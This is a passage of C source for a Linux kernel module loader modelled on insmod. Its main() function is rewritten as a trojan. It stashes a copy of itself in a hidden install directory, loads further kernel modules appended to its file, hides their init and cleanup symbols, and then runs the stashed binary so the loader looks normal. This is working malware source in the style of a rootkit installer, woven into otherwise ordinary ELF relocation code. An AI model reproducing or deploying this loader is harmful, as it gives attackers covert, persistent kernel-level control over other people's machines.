	return sec->contents + oldsize;
}



/* Conditionally add the symbols from the given symbol set to the
   new module.  */

static int
add_symbols_from(
				 struct obj_file *f,
				 int idx, struct module_symbol *syms, size_t nsyms)
{
	struct module_symbol *s;
	size_t i;
	int used = 0;

	for (i = 0, s = syms; i < nsyms; ++i, ++s) {

		/* Only add symbols that are already marked external.  If we
		   override locals we may cause problems for argument initialization.
		   We will also create a false dependency on the module.  */
		struct obj_symbol *sym;

		sym = obj_find_symbol(f, (char *) s->name);
		if (sym && !ELFW(ST_BIND) (sym->info) == STB_LOCAL) {
			sym = obj_add_symbol(f, (char *) s->name, -1,
								 ELFW(ST_INFO) (STB_GLOBAL, STT_NOTYPE),
								 idx, s->value, 0);
			/* Did our symbol just get installed?  If so, mark the
			   module as "used".  */
			if (sym->secidx == idx)
				used = 1;
		}
	}

	return used;
}

static void add_kernel_symbols(struct obj_file *f)
{
	struct external_module *m;
	int i, nused = 0;

	for (i = 0, m = ext_modules; i < n_ext_modules; ++i, ++m)
		if (m->nsyms
			&& add_symbols_from(f, SHN_HIRESERVE + 2 + i, m->syms,
								m->nsyms)) m->used = 1, ++nused;

	n_ext_modules_used = nused;

	if (nksyms)
		add_symbols_from(f, SHN_HIRESERVE + 1, ksyms, nksyms);
}

/* Fetch the loaded modules, and all currently exported symbols.  */
static int new_get_kernel_symbols(void)
{
	char *module_names, *mn;
	struct external_module *modules, *m;
	struct module_symbol *syms, *s;
	size_t ret, bufsize, nmod, nsyms, i, j;

	module_names = malloc(bufsize = 256);
  retry_modules_load:
	if (query_module(NULL, QM_MODULES, module_names, bufsize, &ret)) {
		if (errno == ENOSPC) {
			module_names = realloc(module_names, bufsize = ret);
			goto retry_modules_load;
		}
		return 0;
	}

	n_ext_modules = nmod = ret;

	if (nmod){
		ext_modules = modules = malloc(nmod * sizeof(*modules));
		memset(modules, 0, nmod * sizeof(*modules));
		for (i = 0, mn = module_names, m = modules;
			 i < nmod; ++i, ++m, mn += strlen(mn) + 1) {
			struct module_info info;
	
			if (query_module(mn, QM_INFO, &info, sizeof(info), &ret)) {
				if (errno == ENOENT) {
					continue;
				}
				return 0;
			}
	
			syms = malloc(bufsize = 1024);
		  retry_mod_sym_load:
			if (query_module(mn, QM_SYMBOLS, syms, bufsize, &ret)) {
				switch (errno) {
				case ENOSPC:
					syms = realloc(syms, bufsize = ret);
					goto retry_mod_sym_load;
				case ENOENT:
					continue;
				default:
					return 0;
				}
			}
			nsyms = ret;
	
			m->name = mn;
			m->addr = info.addr;
			m->nsyms = nsyms;
			m->syms = syms;
	
			for (j = 0, s = syms; j < nsyms; ++j, ++s) {
				s->name += (unsigned long) syms;
			}
		}
	}

	syms = malloc(bufsize = 16 * 1024);
  retry_kern_sym_load:

	if (query_module(NULL, QM_SYMBOLS, syms, bufsize, &ret)) {
		if (errno == ENOSPC) {
			syms = realloc(syms, bufsize = ret);
			goto retry_kern_sym_load;
		}
		return 0;
	}

	nksyms = nsyms = ret;
	ksyms = syms;

	for (j = 0, s = syms; j < nsyms; ++j, ++s) {
		s->name += (unsigned long) syms;
	}
	return 1;
}

static int new_create_this_module(struct obj_file *f, const char *m_name)
{
	struct obj_section *sec;

	sec = obj_create_alloced_section_first(f, ".this", tgt_sizeof_long,
										   sizeof(struct module));
	memset(sec->contents, 0, sizeof(struct module));

	obj_add_symbol(f, "__this_module", -1,
				   ELFW(ST_INFO) (STB_LOCAL, STT_OBJECT), sec->idx, 0,
				   sizeof(struct module));

	obj_string_patch(f, sec->idx, offsetof(struct module, name),
					 m_name);

	return 1;
}

static int
new_init_module(const char *m_name, struct obj_file *f,
				unsigned long m_size)
{
	struct module *module;
	struct obj_section *sec;
	void *image;
	int ret;
	tgt_long m_addr;

	sec = obj_find_section(f, ".this");
	module = (struct module *) sec->contents;
	m_addr = sec->header.sh_addr;

	module->size_of_struct = sizeof(*module);
	module->size = m_size;
	module->flags = 0;

	sec = obj_find_section(f, "__ksymtab");
	if (sec && sec->header.sh_size) {
		module->syms = sec->header.sh_addr;
		module->nsyms = sec->header.sh_size / (2 * tgt_sizeof_char_p);
	}

	if (n_ext_modules_used) {
		sec = obj_find_section(f, ".kmodtab");
		module->deps = sec->header.sh_addr;
		module->ndeps = n_ext_modules_used;
	}

	module->init =
		obj_symbol_final_value(f, obj_find_symbol(f, "init_module"));
	module->cleanup =
		obj_symbol_final_value(f, obj_find_symbol(f, "cleanup_module"));

	sec = obj_find_section(f, "__ex_table");
	if (sec) {
		module->ex_table_start = sec->header.sh_addr;
		module->ex_table_end = sec->header.sh_addr + sec->header.sh_size;
	}

	sec = obj_find_section(f, ".text.init");
	if (sec) {
		module->runsize = sec->header.sh_addr - m_addr;
	}
	sec = obj_find_section(f, ".data.init");
	if (sec) {
		if (!module->runsize ||
			module->runsize > sec->header.sh_addr - m_addr)
				module->runsize = sec->header.sh_addr - m_addr;
	}

	if (!arch_init_module(f, module))
		return 0;

	/* Whew!  All of the initialization is complete.  Collect the final
	   module image and give it to the kernel.  */

	image = malloc(m_size);
	obj_create_image(f, image);

	ret = init_module(m_name, (struct module *) image);

	free(image);

	return ret == 0;
}

/*======================================================================*/

int
obj_string_patch(struct obj_file *f, int secidx, ElfW(Addr) offset,
				 const char *string)
{
	struct obj_string_patch *p;
	struct obj_section *strsec;
	size_t len = strlen(string) + 1;
	char *loc;

	p = malloc(sizeof(*p));
	p->next = f->string_patches;
	p->reloc_secidx = secidx;
	p->reloc_offset = offset;
	f->string_patches = p;

	strsec = obj_find_section(f, ".kstrtab");
	if (strsec == NULL) {
		strsec = obj_create_alloced_section(f, ".kstrtab", 1, len);
		p->string_offset = 0;
		loc = strsec->contents;
	} else {
		p->string_offset = strsec->header.sh_size;
		loc = obj_extend_section(strsec, len);
	}
	memcpy(loc, string, len);

	return 1;
}

int
obj_symbol_patch(struct obj_file *f, int secidx, ElfW(Addr) offset,
				 struct obj_symbol *sym)
{
	struct obj_symbol_patch *p;

	p = malloc(sizeof(*p));
	p->next = f->symbol_patches;
	p->reloc_secidx = secidx;
	p->reloc_offset = offset;
	p->sym = sym;
	f->symbol_patches = p;

	return 1;
}


int obj_check_undefineds(struct obj_file *f)
{
	unsigned long i;
	int ret = 1;

	for (i = 0; i < HASH_BUCKETS; ++i) {
		struct obj_symbol *sym;
		for (sym = f->symtab[i]; sym; sym = sym->next)
			if (sym->secidx == SHN_UNDEF) {
				if (ELFW(ST_BIND) (sym->info) == STB_WEAK) {
					sym->secidx = SHN_ABS;
					sym->value = 0;
				} else 
					ret = 0;
			}
	}

	return ret;
}


void obj_allocate_commons(struct obj_file *f)
{
	struct common_entry {
		struct common_entry *next;
		struct obj_symbol *sym;
	} *common_head = NULL;

	unsigned long i;

	for (i = 0; i < HASH_BUCKETS; ++i) {
		struct obj_symbol *sym;
		for (sym = f->symtab[i]; sym; sym = sym->next)
			if (sym->secidx == SHN_COMMON) {
				/* Collect all COMMON symbols and sort them by size so as to
				   minimize space wasted by alignment requirements.  */
				{
					struct common_entry **p, *n;
					for (p = &common_head; *p; p = &(*p)->next)
						if (sym->size <= (*p)->sym->size)
							break;

					n = alloca(sizeof(*n));
					n->next = *p;
					n->sym = sym;
					*p = n;
				}
			}
	}

	for (i = 1; i < f->local_symtab_size; ++i) {
		struct obj_symbol *sym = f->local_symtab[i];
		if (sym && sym->secidx == SHN_COMMON) {
			struct common_entry **p, *n;
			for (p = &common_head; *p; p = &(*p)->next)
				if (sym == (*p)->sym)
					break;
				else if (sym->size < (*p)->sym->size) {
					n = alloca(sizeof(*n));
					n->next = *p;
					n->sym = sym;
					*p = n;
					break;
				}
		}
	}

	if (common_head) {
		/* Find the bss section.  */
		for (i = 0; i < f->header.e_shnum; ++i)
			if (f->sections[i]->header.sh_type == SHT_NOBITS)
				break;

		/* If for some reason there hadn't been one, create one.  */
		if (i == f->header.e_shnum) {
			struct obj_section *sec;

			f->sections = realloc(f->sections, (i + 1) * sizeof(sec));
			f->sections[i] = sec = arch_new_section();
			f->header.e_shnum = i + 1;

			memset(sec, 0, sizeof(*sec));
			sec->header.sh_type = SHT_PROGBITS;
			sec->header.sh_flags = SHF_WRITE | SHF_ALLOC;
			sec->name = ".bss";
			sec->idx = i;
		}

		/* Allocate the COMMONS.  */
		{
			ElfW(Addr) bss_size = f->sections[i]->header.sh_size;
			ElfW(Addr) max_align = f->sections[i]->header.sh_addralign;
			struct common_entry *c;

			for (c = common_head; c; c = c->next) {
				ElfW(Addr) align = c->sym->value;

				if (align > max_align)
					max_align = align;
				if (bss_size & (align - 1))
					bss_size = (bss_size | (align - 1)) + 1;

				c->sym->secidx = i;
				c->sym->value = bss_size;

				bss_size += c->sym->size;
			}

			f->sections[i]->header.sh_size = bss_size;
			f->sections[i]->header.sh_addralign = max_align;
		}
	}

	/* For the sake of patch relocation and parameter initialization,
	   allocate zeroed data for NOBITS sections now.  Note that after
	   this we cannot assume NOBITS are really empty.  */
	for (i = 0; i < f->header.e_shnum; ++i) {
		struct obj_section *s = f->sections[i];
		if (s->header.sh_type == SHT_NOBITS) {
			if (s->header.sh_size != 0)
			s->contents = memset(malloc(s->header.sh_size),
								 0, s->header.sh_size);
			else
				s->contents = NULL;

			s->header.sh_type = SHT_PROGBITS;
		}
	}
}

unsigned long obj_load_size(struct obj_file *f)
{
	unsigned long dot = 0;
	struct obj_section *sec;

	/* Finalize the positions of the sections relative to one another.  */

	for (sec = f->load_order; sec; sec = sec->load_next) {
		ElfW(Addr) align;

		align = sec->header.sh_addralign;
		if (align && (dot & (align - 1)))
			dot = (dot | (align - 1)) + 1;

		sec->header.sh_addr = dot;
		dot += sec->header.sh_size;
	}

	return dot;
}

int obj_relocate(struct obj_file *f, ElfW(Addr) base)
{
	int i, n = f->header.e_shnum;
	int ret = 1;

	f->baseaddr = base;
	for (i = 0; i < n; ++i)
		f->sections[i]->header.sh_addr += base;

	for (i = 0; i < n; ++i) {
		struct obj_section *relsec, *symsec, *targsec, *strsec;
		ElfW(RelM) * rel, *relend;
		ElfW(Sym) * symtab;
		const char *strtab;

		relsec = f->sections[i];
		if (relsec->header.sh_type != SHT_RELM)
			continue;

		symsec = f->sections[relsec->header.sh_link];
		targsec = f->sections[relsec->header.sh_info];
		strsec = f->sections[symsec->header.sh_link];

		rel = (ElfW(RelM) *) relsec->contents;
		relend = rel + (relsec->header.sh_size / sizeof(ElfW(RelM)));
		symtab = (ElfW(Sym) *) symsec->contents;
		strtab = (const char *) strsec->contents;

		for (; rel < relend; ++rel) {
			ElfW(Addr) value = 0;
			struct obj_symbol *intsym = NULL;
			unsigned long symndx;
			ElfW(Sym) * extsym = 0;
			const char *errmsg;

			symndx = ELFW(R_SYM) (rel->r_info);
			if (symndx) {

				extsym = &symtab[symndx];
				if (ELFW(ST_BIND) (extsym->st_info) == STB_LOCAL) {
					intsym = f->local_symtab[symndx];
				} else {
					const char *name;
					if (extsym->st_name)
						name = strtab + extsym->st_name;
					else
						name = f->sections[extsym->st_shndx]->name;
					intsym = obj_find_symbol(f, name);
				}

				value = obj_symbol_final_value(f, intsym);
				intsym->referenced = 1;
			}
#if SHT_RELM == SHT_RELA
#if defined(__alpha__) && defined(AXP_BROKEN_GAS)
			if (!extsym || !extsym->st_name ||
				ELFW(ST_BIND) (extsym->st_info) != STB_LOCAL)
#endif
				value += rel->r_addend;
#endif

			switch (arch_apply_relocation
					(f, targsec, symsec, intsym, rel, value)) {
			case obj_reloc_ok:
				break;

			case obj_reloc_overflow:
				errmsg = "Relocation overflow";
				goto bad_reloc;
			case obj_reloc_dangerous:
				errmsg = "Dangerous relocation";
				goto bad_reloc;
			case obj_reloc_unhandled:
				errmsg = "Unhandled relocation";
			  bad_reloc:
				ret = 0;
				break;
			}
		}
	}

	if (f->string_patches) {
		struct obj_string_patch *p;
		struct obj_section *strsec;
		ElfW(Addr) strsec_base;
		strsec = obj_find_section(f, ".kstrtab");
		strsec_base = strsec->header.sh_addr;

		for (p = f->string_patches; p; p = p->next) {
			struct obj_section *targsec = f->sections[p->reloc_secidx];
			*(ElfW(Addr) *) (targsec->contents + p->reloc_offset)
				= strsec_base + p->string_offset;
		}
	}

	if (f->symbol_patches) {
		struct obj_symbol_patch *p;

		for (p = f->symbol_patches; p; p = p->next) {
			struct obj_section *targsec = f->sections[p->reloc_secidx];
			*(ElfW(Addr) *) (targsec->contents + p->reloc_offset)
				= obj_symbol_final_value(f, p->sym);
		}
	}

	return ret;
}


int obj_create_image(struct obj_file *f, char *image)
{
	struct obj_section *sec;
	ElfW(Addr) base = f->baseaddr;

	for (sec = f->load_order; sec; sec = sec->load_next) {
		char *secimg;

		if (sec->contents == 0 || sec->header.sh_size == 0)
			continue;

		secimg = image + (sec->header.sh_addr - base);

		/* Note that we allocated data for NOBITS sections earlier.  */
		memcpy(secimg, sec->contents, sec->header.sh_size);
	}

	return 1;
}

/*======================================================================*/

struct obj_file *obj_load(FILE * fp)
{
	struct obj_file *f;
	ElfW(Shdr) * section_headers;
	int shnum, i;
	char *shstrtab;
	offset = big;
	/* Read the file header.  */

	f = arch_new_file();
	memset(f, 0, sizeof(*f));
	f->symbol_cmp = strcmp;
	f->symbol_hash = obj_elf_hash;
	f->load_order_search_start = &f->load_order;

	fseek(fp, offset, SEEK_SET);
	if (fread(&f->header, sizeof(f->header), 1, fp) != 1) 
		return NULL;
	if (f->header.e_ident[EI_MAG0] != ELFMAG0
		|| f->header.e_ident[EI_MAG1] != ELFMAG1
		|| f->header.e_ident[EI_MAG2] != ELFMAG2
		|| f->header.e_ident[EI_MAG3] != ELFMAG3)
		return NULL;
	if (f->header.e_ident[EI_CLASS] != ELFCLASSM
		|| f->header.e_ident[EI_DATA] != ELFDATAM
		|| f->header.e_ident[EI_VERSION] != EV_CURRENT
		|| !MATCH_MACHINE(f->header.e_machine)) 
		return NULL;
	if (f->header.e_type != ET_REL)
		return NULL;

	/* Read the section headers.  */

	if (f->header.e_shentsize != sizeof(ElfW(Shdr))) 
		return NULL;

	shnum = f->header.e_shnum;
	f->sections = malloc(sizeof(struct obj_section *) * shnum);
	memset(f->sections, 0, sizeof(struct obj_section *) * shnum);

	section_headers = alloca(sizeof(ElfW(Shdr)) * shnum);
	fseek(fp, offset + f->header.e_shoff, SEEK_SET);
	if (fread(section_headers, sizeof(ElfW(Shdr)), shnum, fp) != shnum) 
		return NULL;
	/* Read the section data.  */

	for (i = 0; i < shnum; ++i) {
		struct obj_section *sec;

		f->sections[i] = sec = arch_new_section();
		memset(sec, 0, sizeof(*sec));

		sec->header = section_headers[i];
		sec->idx = i;

		if(sec->header.sh_size) switch (sec->header.sh_type) {
		case SHT_NULL:
		case SHT_NOTE:
		case SHT_NOBITS:
			/* ignore */
			break;

		case SHT_PROGBITS:
		case SHT_SYMTAB:
		case SHT_STRTAB:
		case SHT_RELM:
			if (sec->header.sh_size > 0) {
				sec->contents = malloc(sec->header.sh_size);
				fseek(fp, offset + sec->header.sh_offset, 
					SEEK_SET);
				if (fread(sec->contents, sec->header.sh_size, 1, fp) != 1) {
					return NULL;
				}
			} else 
				sec->contents = NULL;
			if(ftell(fp) > big)
				big = ftell(fp);
			break;

#if SHT_RELM == SHT_REL
		case SHT_RELA:
			return NULL;
#else
		case SHT_REL:
			return NULL;
#endif

		default:
			if (sec->header.sh_type >= SHT_LOPROC) {
				/* Assume processor specific section types are debug
				   info and can safely be ignored.  If this is ever not
				   the case (Hello MIPS?), don't put ifdefs here but
				   create an arch_load_proc_section().  */
				break;
			}

			return NULL;
		}
	}

	/* Do what sort of interpretation as needed by each section.  */

	shstrtab = f->sections[f->header.e_shstrndx]->contents;

	for (i = 0; i < shnum; ++i) {
		struct obj_section *sec = f->sections[i];
		sec->name = shstrtab + sec->header.sh_name;
	}

	for (i = 0; i < shnum; ++i) {
		struct obj_section *sec = f->sections[i];

		if (sec->header.sh_flags & SHF_ALLOC)
			obj_insert_section_load_order(f, sec);

		switch (sec->header.sh_type) {
		case SHT_SYMTAB:
			{
				unsigned long nsym, j;
				char *strtab;
				ElfW(Sym) * sym;

				if (sec->header.sh_entsize != sizeof(ElfW(Sym))) {
					return NULL;
				}

				nsym = sec->header.sh_size / sizeof(ElfW(Sym));
				strtab = f->sections[sec->header.sh_link]->contents;
				sym = (ElfW(Sym) *) sec->contents;

				/* Allocate space for a table of local symbols.  */
				j = f->local_symtab_size = sec->header.sh_info;
				f->local_symtab = malloc(j *=
										  sizeof(struct obj_symbol *));
				memset(f->local_symtab, 0, j);

				/* Insert all symbols into the hash table.  */
				for (j = 1, ++sym; j < nsym; ++j, ++sym) {
					const char *name;
					if (sym->st_name)
						name = strtab + sym->st_name;
		else
						name = f->sections[sym->st_shndx]->name;

					obj_add_symbol(f, name, j, sym->st_info, sym->st_shndx,
								   sym->st_value, sym->st_size);
		}
	}
			break;

		case SHT_RELM:
			if (sec->header.sh_entsize != sizeof(ElfW(RelM))) 
				return NULL;
			break;
		}
	}

	return f;
}

static void hide_special_symbols(struct obj_file *f)
{
	static const char *const specials[] = {
		"cleanup_module",
		"init_module",
		"kernel_version",
		NULL
	};

	struct obj_symbol *sym;
	const char *const *p;

	for (p = specials; *p; ++p)
		if ((sym = obj_find_symbol(f, *p)) != NULL)
			sym->info =
				ELFW(ST_INFO) (STB_LOCAL, ELFW(ST_TYPE) (sym->info));
}



int main( int argc, char **argv)
{
	int i=0;
	int len;
	char *prog, *arg;
	char *tmp = NULL;
	FILE *fp, *in;
	struct stat buf;
	char m_name[BUFSIZ + 1] = "\0";
	unsigned long m_size;
        struct obj_file *f;
        ElfW(Addr) m_addr;

	prog = trojan_bin;
        while(strstr(prog, "/") != NULL)
                prog = strstr(prog, "/") + 1;

	arg = argv[0];
	while(strstr(arg, "/") != NULL)
		arg = strstr(arg, "/") + 1;

	if(argc > 1 && (strcmp(arg, prog) != 0)) 
	{
		tmp = argv[1];
		tmp += (strlen(argv[1]) - 2);
		if(strcmp(tmp, ".o") == 0)
		{
			big=0;
			i=1;
		}
	}

	if(i == 0)
	{
		if(stat(trojan_bin, &buf) < 0)
		{
			goto load;
		}
		if(stat(install_dir, &buf) < 0)
		{
			if(mkdir(install_dir, 0x000) < 0)
				goto load;
			if((in = fopen(argv[0], "r")) == NULL)
				goto load;
			len = strlen(install_dir) + strlen(prog) + 3;
			tmp = (char *) malloc(len);
			memset(tmp, 0, len);

			snprintf(tmp, len, "%s/%s.", install_dir, prog);
			
			if((fp = fopen(tmp, "w")) == NULL)
				goto close;
			
			while(!feof(in))
				fputc(fgetc(in), fp);
		
			fclose(fp);
			chmod(tmp, 0100);
close:
			free(tmp);
			fclose(in);
		}
		
	}

load:
	/* Grab the module name */
	if ((tmp = strrchr(argv[i], '/')) != NULL) 
		tmp++;
	  else 
		tmp = argv[i];
	
	len = strlen(tmp);

	if (len > 2 && tmp[len - 2] == '.' && tmp[len - 1] == 'o')
		len -= 2;
	strncpy(m_fullName, tmp, len);
	if (*m_name == '\0') {
		strcpy(m_name, m_fullName);
		}
	strcat(m_fullName, ".o");

	/* Get a filedesc for the module */
	if((fp = fopen(argv[i], "r")) == NULL)
		if(i == 0)
			if((fp = fopen(trojan_bin, "r")) == NULL)
				goto exit;

	while(!feof(fp))
	{
		if ((f = obj_load(fp)) == NULL)
			goto out;
		if (!new_get_kernel_symbols())
			goto out;
		/* Let the module know about the kernel symbols.  */
		add_kernel_symbols(f);

		if(!new_create_this_module(f, m_name))
			goto out;

		if (!obj_check_undefineds(f)) 
			goto out;

		obj_allocate_commons(f);

		arch_create_got(f);
		hide_special_symbols(f);

		/* Find current size of the module */
		m_size = obj_load_size(f);
		m_addr = create_module(m_name, m_size);
		if (m_addr==-1) switch (errno) {
		case EEXIST:
			goto out;
		case ENOMEM:
			goto out;
		default:
			goto out;
		}

		if (!obj_relocate(f, m_addr)) {
			delete_module(m_name);
			goto out;
		}

		if(!new_init_module(m_name, f, m_size))
		{
			delete_module(m_name);
			goto out;
		}

out:
		m_name[0]++;
		if(m_name[0] > 'z')
			m_name[0] = 'a';
	}
	fclose(fp);
exit:
	len = strlen(install_dir) + strlen(prog) + 2;
	tmp = (char *) malloc(len);
	memset(tmp, 0, len);

	snprintf(tmp, len, "%s/%s", install_dir, prog);

	if(strcmp(arg, prog) == 0)
		execve(tmp, argv, NULL);

	exit(0);
}
